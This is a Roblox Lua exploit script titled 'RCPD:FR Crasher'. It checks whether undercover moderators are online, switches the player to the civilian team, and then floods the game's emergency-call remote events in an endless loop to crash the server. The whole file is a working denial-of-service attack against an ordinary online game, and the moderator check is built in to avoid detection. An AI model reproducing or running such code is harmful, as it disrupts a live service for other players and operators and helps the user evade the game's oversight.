-- By Error-Cezar#2048

local Staff = {}
local crash = nil

for _,v in pairs(game:GetService("Players"):GetPlayers()) do
if v:findFirstChild("StaffUnderCoverMode") then
    table.insert(Staff, v)
end
end

if #Staff == 0 then
    crash = true
else
local Bindable = Instance.new("BindableFunction")
Bindable.OnInvoke = function(who, buttonpressed)
	--print("invoke received by "..who)
		if who == "Yes" then
		    crash = true
		else
		    crash = false
		end
end

game:GetService("StarterGui"):SetCore(
		"SendNotification",
		{
			Title = "RCPD:FR Crasher",
			Duration = 10,
			Text = #Staff.." Moderator is online, continue?",
			Button1 = "Yes",
			Button2 = "No",
			Callback = Bindable
		}
	)
end
repeat wait() until crash ~= nil
if crash == false then return end

function notify(text)
    game:GetService("StarterGui"):SetCore(
		"SendNotification",
		{
			Title = "RCPD:FR Crasher",
			Duration = 5,
			Text = text
		}
	)
end
notify("Crasher starting...")

if not game:GetService("Players").LocalPlayer.Team.TeamColor ~= "White" then -- Check if the player is in civilian team
    notify("Switching to Civilian team..")
    game:GetService("ReplicatedStorage").changeTeams:FireServer(BrickColor.new("White")) -- Change team to civilian
    wait(1) -- Wait to avoid firing while not being a civilian
end


notify("Crashing server, please wait.")

while wait() do

local Top = "L" -- The string will be the top text

local Bottom = "L" -- The string will be the bottom text

-- Sends 911 requests to all emergency teams, making them crash.

game:GetService("ReplicatedStorage").siniScripts.Radio.newCall:FireServer("FD", Top, Bottom)

game:GetService("ReplicatedStorage").siniScripts.Radio.newCall:FireServer("PD", Top, Bottom)

game:GetService("ReplicatedStorage").siniScripts.Radio.newCall:FireServer("EMS", Top, Bottom)

game:GetService("ReplicatedStorage").siniScripts.Radio.newCall:FireServer("DOT", Top, Bottom)
  
game:GetService("ReplicatedStorage").siniScripts.Radio.newCall:FireServer("FD", Top, Bottom)

game:GetService("ReplicatedStorage").siniScripts.Radio.newCall:FireServer("PD", Top, Bottom)

game:GetService("ReplicatedStorage").siniScripts.Radio.newCall:FireServer("EMS", Top, Bottom)

game:GetService("ReplicatedStorage").siniScripts.Radio.newCall:FireServer("DOT", Top, Bottom)

end
